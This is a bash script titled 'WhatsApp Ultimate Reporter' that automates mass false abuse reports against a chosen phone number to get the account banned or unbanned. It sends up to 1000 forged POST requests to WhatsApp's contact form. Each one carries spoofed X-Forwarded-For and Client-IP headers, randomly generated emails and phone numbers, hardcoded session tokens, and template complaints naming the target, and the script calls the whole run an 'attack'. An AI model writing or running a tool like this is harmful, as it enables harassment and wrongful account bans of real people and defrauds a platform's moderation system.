clear
#!/bin/bash

# WhatsApp Ultimate Reporter - Bash Version with Auto URL Sending

# Initialize colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Configuration
WHATSAPP_API_URL="https://www.whatsapp.com/contact/noclient/"
REPORT_URL="https://faq.whatsapp.com/3379690015658337/?helpref=uf_share"
LOG_FILE="whatsapp_ultimate.log"
PHONES_DB="phones.db"
IPS_DB="ips.db"
BAN_MSG_FILE="message_ban_whatsapp.json"
UNBAN_MSG_FILE="message_unban_whatsapp.json"
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36"

# Banner
clear
echo -e "${GREEN}"
echo " _    _ _   _ _   _ _____ ___  ______   __ _____ _____ _____  "
echo "| |  | | | | | \ | |_   _/ _ \|  _ \ \ / /|_   _|  ___|  ___| "
echo "| |  | | | | |  \| | | || | | | |_) \ V /   | | | |__ | |__   "
echo "| |/\| | | | | |\  | | || |_| |  _ < \ /    | | |  __||  __|  "
echo "\  /\  / |_| | | \ |_| |_\___/|_| \_\| |    |_| | |___| |___  "
echo " \/  \/ \___/|_|  \_\___/            |_|        |_|_____|_____| "
echo -e "${NC}"
echo -e "${YELLOW}WhatsApp Ultimate Reporter - Auto URL Sending${NC}"
echo -e "${YELLOW}============================================${NC}"
echo -e "Created by ${WHITE}>>LORDHOZOO<<${NC}  "
echo

# Check dependencies
check_dependencies() {
    local missing=()
    for cmd in curl jq shuf; do
        if ! command -v $cmd &> /dev/null; then
            missing+=("$cmd")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}Missing dependencies:${NC} ${missing[*]}"
        echo "On Ubuntu/Debian, run: sudo apt-get install ${missing[*]}"
        exit 1
    fi
}

# Check required files
check_files() {
    for file in "$PHONES_DB" "$IPS_DB" "$BAN_MSG_FILE" "$UNBAN_MSG_FILE"; do
        if [ ! -f "$file" ]; then
            echo -e "${RED}Error: $file file not found!${NC}"
            exit 1
        fi
    done
}

# Validate phone number with country code
validate_phone() {
    local phone=$1
    if [[ $phone =~ ^\+[0-9]{1,4}[0-9]{10,12}$ ]]; then
        return 0
    else
        return 1
    fi
}

# Generate random email
generate_random_email() {
    local length=10
    local chars=abcdefghijklmnopqrstuvwxyz0123456789
    local random_name=""
    for (( i=0; i<length; i++ )); do
        random_name+=${chars:$(( RANDOM % ${#chars} )):1}
    done
    echo "${random_name}@gmail.com"
}

# Generate random phone number based on country
generate_random_phone() {
    local country=$1
    case $country in
        "ID") echo "+62"$(( RANDOM % 9 + 1 ))$(printf "%08d" $(( RANDOM % 100000000 ))) ;;
        "EG") echo "+20"$(( RANDOM % 9 + 1 ))$(printf "%08d" $(( RANDOM % 100000000 ))) ;;
        "US") echo "+1"$(printf "%09d" $(( RANDOM % 1000000000 ))) ;;
        "KR") echo "+82"$(( RANDOM % 9 + 1 ))$(printf "%08d" $(( RANDOM % 100000000 ))) ;;
        "CN") echo "+86"$(( RANDOM % 9 + 1 ))$(printf "%08d" $(( RANDOM % 100000000 ))) ;;
        "IN") echo "+91"$(printf "%09d" $(( RANDOM % 1000000000 ))) ;;
        *) echo "0"$(printf "%09d" $(( RANDOM % 1000000000 ))) ;;
    esac
}

# Get random line from file
get_random_line() {
    local file=$1
    shuf -n 1 "$file"
}

# URL encode function
urlencode() {
    local string="${1}"
    local length=${#string}
    local encoded=""
    local pos c o

    for (( pos=0 ; pos<length ; pos++ )); do
        c=${string:$pos:1}
        case "$c" in
            [-_.~a-zA-Z0-9]) o="${c}" ;;
            *) printf -v o '%%%02x' "'$c"
        esac
        encoded+="${o}"
    done
    echo "${encoded}"
}

# Send API request
send_api_request() {
    local post_data=$1
    local random_ip=$2
    
    local headers=(
        "Host: www.whatsapp.com"
        "Cookie: wa_lang_pref=ar; wa_ul=f01bc326-4a06-4e08-82d9-00b74ae8e830; wa_csrf=HVi-YVV_BloLmh-WHL8Ufz"
        "Sec-Ch-Ua-Platform: \"Linux\""
        "Accept-Language: en-US,en;q=0.9"
        "Sec-Ch-Ua: \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\""
        "Sec-Ch-Ua-Mobile: ?0"
        "X-Asbd-Id: 129477"
        "X-Fb-Lsd: AVpbkNjZYpw"
        "User-Agent: $USER_AGENT"
        "Content-Type: application/x-www-form-urlencoded"
        "Accept: */*"
        "Origin: https://www.whatsapp.com"
        "Sec-Fetch-Site: same-origin"
        "Sec-Fetch-Mode: cors"
        "Sec-Fetch-Dest: empty"
        "Referer: https://www.whatsapp.com/contact/"
        "Accept-Encoding: gzip, deflate, br"
        "X-Forwarded-For: $random_ip"
        "Client-IP: $random_ip"
    )
    
    curl -s -X POST "$WHATSAPP_API_URL" \
        -H "${headers[0]}" -H "${headers[1]}" -H "${headers[2]}" -H "${headers[3]}" \
        -H "${headers[4]}" -H "${headers[5]}" -H "${headers[6]}" -H "${headers[7]}" \
        -H "${headers[8]}" -H "${headers[9]}" -H "${headers[10]}" -H "${headers[11]}" \
        -H "${headers[12]}" -H "${headers[13]}" -H "${headers[14]}" -H "${headers[15]}" \
        -H "${headers[16]}" -H "${headers[17]}" -H "${headers[18]}" \
        --data-raw "$post_data" \
        -w "\n%{http_code}"
}

# Send ultimate report URL
send_report_url() {
    local phone_number=$1
    local report_url="${REPORT_URL}&phone=${phone_number}"
    
    echo -e "${YELLOW}Sending ultimate report URL:${NC} ${report_url}"
    
    # Try to open in default browser (Linux)
    if command -v xdg-open &> /dev/null; then
        xdg-open "$report_url" 2>/dev/null
    # Try on macOS
    elif command -v open &> /dev/null; then
        open "$report_url" 2>/dev/null
    fi
    
    # Also log it
    echo "Report URL sent: $report_url" >> "$LOG_FILE"
}

# Main attack function
perform_attack() {
    local num_requests=$1
    local delay=$2
    local target_number=$3
    local action=$4
    
    # Load appropriate message file
    local messages_file="$BAN_MSG_FILE"
    if [ "$action" == "unban" ]; then
        messages_file="$UNBAN_MSG_FILE"
    fi
    
    # Parse JSON file
    local messages=()
    while IFS= read -r line; do
        messages+=("$line")
    done < <(jq -c '.[]' "$messages_file")
    
    if [ ${#messages[@]} -eq 0 ]; then
        echo -e "${RED}No messages found in $messages_file${NC}"
        return 1
    fi
    
    # Countries list with emphasis on Indonesia
    local countries=("ID" "ID" "ID" "EG" "US" "KR" "CN" "IN")
    local platforms=("ANDROID" "IPHONE" "WHATS_APP_WEB_DESKTOP" "KAIOS" "OTHER")
    
    for ((i=1; i<=num_requests; i++)); do
        # Get random values
        local random_phone=$(get_random_line "$PHONES_DB")
        local random_ip=$(get_random_line "$IPS_DB")
        local random_message=$(echo "${messages[$(( RANDOM % ${#messages[@]} ))]}" | jq -r '.message' | sed "s/\[###\]/$target_number/g")
        local random_subject=$(echo "${messages[$(( RANDOM % ${#messages[@]} ))]}" | jq -r '.subject')
        local country_selector=${countries[$(( RANDOM % ${#countries[@]} ))]}
        local platform=${platforms[$(( RANDOM % ${#platforms[@]} ))]}
        local email=$(generate_random_email)
        local phone_number=$(generate_random_phone "$country_selector")
        local jazoest="20000$(( RANDOM % 90000 + 10000 ))"
        local __hsi=$(( RANDOM % 999999999999999999 + 1000000000000000000 ))
        local __req=$(awk -v min=0.1 -v max=10 'BEGIN{srand(); printf "%.6f\n", min+rand()*(max-min)}')
        local __a=$(( RANDOM % 1000000000 + 1 ))
        local __rev=$(( RANDOM % 9000000000 + 1000000000 ))
        
        # Prepare data
        local post_data="country_selector=${country_selector}&email=$(urlencode "$email")&email_confirm=$(urlencode "$email")&phone_number=$(urlencode "$phone_number")&platform=${platform}&your_message=$(urlencode "${random_subject}%A0${random_message}")&step=articles&__user=0&__a=${__a}&__req=${__req}&__hs=20110.BP%3Awhatsapp_www_pkg.2.0.0.0.0&dpr=1&__ccg=UNKNOWN&__rev=${__rev}&__s=ugvlz3%3A6skj2s%3A4yux6k&__hsi=${__hsi}&__dyn=7xeUmwkHg7ebwKBAg5S1Dxu13wqovzEdEc8uxa1twYwJw4BwUx60Vo1upE4W0OE3nwaq0yE1VohwnU14E9k2C0iK0D82Ixe0EUjwdq1iwmE2ewnE2Lw5XwSyES0gq0Lo6-1Fw4mwr81UU7u1rwGwbu&__csr=&lsd=AVpbkNjZYpw&jazoest=${jazoest}"
        
        # Send request
        local response=$(send_api_request "$post_data" "$random_ip")
        local http_code=$(echo "$response" | tail -n1)
        local response_body=$(echo "$response" | head -n -1)
        
        # Log response
        echo -e "Request: $i\nIP: $random_ip\nPhone: $random_phone\nData: $post_data\nResponse: $response_body\nHTTP Code: $http_code\n" >> "$LOG_FILE"
        
        # Display result
        if [ "$http_code" -eq 200 ]; then
            echo -e "${RED}request:${GREEN}($i) ${RED}device?:${GREEN}${random_phone} ${RED}IP:${GREEN}${random_ip} ${BLUE}-> ${WHITE}Email:${email} | Phone:${country_selector} ${phone_number} | Target -> ${target_number}"
        else
            echo -e "${RED}${random_ip} $i - Request failed with status code: ${http_code}${NC}"
        fi
        
        # Send ultimate report URL every 5 requests
        if (( i % 5 == 0 )); then
            send_report_url "$target_number"
        fi
        
        # Delay between requests
        if [ $i -lt $num_requests ]; then
            sleep $delay
        fi
    done
    
    # Final report URL send
    send_report_url "$target_number"
}

# Main function
main() {
    check_dependencies
    check_files
    
    # Get target phone number
    while true; do
        echo -e "${CYAN}Enter the target phone number with country code (e.g. +628123456789): ${NC}"
        read -r target_number
        
        if validate_phone "$target_number"; then
            echo -e "${GREEN}Valid target number: ${target_number}${NC}"
            break
        else
            echo -e "${RED}Invalid format. Example: +628123456789 (Indonesia)${NC}"
        fi
    done
    
    # Get action type
    while true; do
        echo -e "${CYAN}Select action type (ban/unban): ${NC}"
        read -r action
        
        if [[ "$action" == "ban" || "$action" == "unban" ]]; then
            echo -e "${GREEN}Action confirmed: ${action}${NC}"
            break
        else
            echo -e "${RED}Invalid choice. Please enter 'ban' or 'unban'.${NC}"
        fi
    done
    
    # Get number of requests
    while true; do
        echo -e "${CYAN}Enter number of attack requests (1-1000): ${NC}"
        read -r num_requests
        
        if [[ "$num_requests" =~ ^[0-9]+$ && "$num_requests" -gt 0 && "$num_requests" -le 1000 ]]; then
            break
        else
            echo -e "${RED}Please enter a number between 1-1000.${NC}"
        fi
    done
    
    # Get delay between requests
    while true; do
        echo -e "${CYAN}Enter delay between requests in seconds (1-60): ${NC}"
        read -r delay
        
        if [[ "$delay" =~ ^[0-9]+$ && "$delay" -ge 1 && "$delay" -le 60 ]]; then
            break
        else
            echo -e "${RED}Please enter a number between 1-60.${NC}"
        fi
    done
    
    # Confirm action
    echo -e "${YELLOW}Preparing to launch attack:${NC}"
    echo -e "Target: ${WHITE}${target_number}${NC}"
    echo -e "Action: ${WHITE}${action}${NC}"
    echo -e "Requests: ${WHITE}${num_requests}${NC}"
    echo -e "Delay: ${WHITE}${delay} seconds${NC}"
    
    echo -e "\n${RED}WARNING: This will send actual requests to WhatsApp servers. Use responsibly.${NC}"
    read -p "Are you sure you want to proceed? (y/n): " -n 1 -r
    echo
    
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo -e "${GREEN}Starting attack...${NC}"
        perform_attack "$num_requests" "$delay" "$target_number" "$action"
        echo -e "${GREEN}Attack completed. Check ${LOG_FILE} for details.${NC}"
    else
        echo -e "${YELLOW}Operation cancelled.${NC}"
    fi
}

# Run main function
main
